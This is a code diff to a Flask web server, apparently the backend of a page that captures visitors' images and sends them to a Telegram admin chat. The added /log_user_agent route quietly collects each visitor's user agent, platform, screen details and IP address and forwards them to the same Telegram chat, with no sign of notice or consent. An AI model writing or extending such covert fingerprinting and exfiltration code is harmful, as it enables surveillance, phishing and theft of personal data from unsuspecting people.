@@ -37,7 +37,7 @@ def send_to_telegram(image_bytes, filename):
         }
         data = {
             'chat_id': TELEGRAM_ADMIN_ID,
-            'caption': '📸 Ảnh mới'
+            'caption': '📸 New Picture'
         }
         requests.post(
             f'{TELEGRAM_API_URL}/sendPhoto',
@@ -63,6 +63,41 @@ def serve_js():
 @app.route('/style.css')
 def serve_css():
     return send_from_directory(BASE_DIR, 'style.css')
+
+@app.route('/log_user_agent', methods=['POST'])
+def log_user_agent():
+    try:
+        data = request.json or {}
+
+        ua = data.get('user_agent', 'unknown')
+        platform = data.get('platform', '')
+        screen = data.get('screen', '')
+        dpr = data.get('dpr', '')
+
+        message = (
+            "<blockquote>"
+            "📱 <b>User Agent Detected</b>\n\n"
+            f"🧠 <b>UA:</b>\n<code>{ua}</code>\n\n"
+            f"💻 <b>Platform:</b> {platform}\n"
+            f"🖥 <b>Screen:</b> {screen}\n"
+            f"🔍 <b>DPR:</b> {dpr}\n"
+            f"🌐 <b>IP:</b> {request.remote_addr}"
+            "</blockquote>"
+        )
+
+        requests.post(
+            f"{TELEGRAM_API_URL}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_ADMIN_ID,
+                "text": message,
+                "parse_mode": "HTML"
+            },
+            timeout=10
+        )
+
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/save_image', methods=['POST'])
 def save_image():
